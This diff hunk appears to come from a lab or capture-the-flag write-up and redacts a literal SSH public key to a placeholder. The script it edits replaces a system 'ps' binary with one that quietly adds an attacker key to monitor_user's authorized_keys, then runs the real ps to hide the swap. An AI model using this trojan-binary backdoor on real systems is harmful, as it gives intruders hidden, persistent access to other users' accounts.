@@ -288,7 +288,7 @@ From the `dev_user` shell, we wrote a payload into `/opt/dev/bin/ps` to create `
 cat > /opt/dev/bin/ps <<'EOF'
 #!/bin/bash
 mkdir -p /home/monitor_user/.ssh
-echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGKeQHESrwx6TPGQZS1fyQGJtoKzUM7ar4AnqIBGIIX/ jump-key' >> /home/monitor_user/.ssh/authorized_keys
+echo '<PUBLIC-KEY>' >> /home/monitor_user/.ssh/authorized_keys
 chmod 700 /home/monitor_user/.ssh
 chmod 600 /home/monitor_user/.ssh/authorized_keys
 /usr/bin/ps "$@"
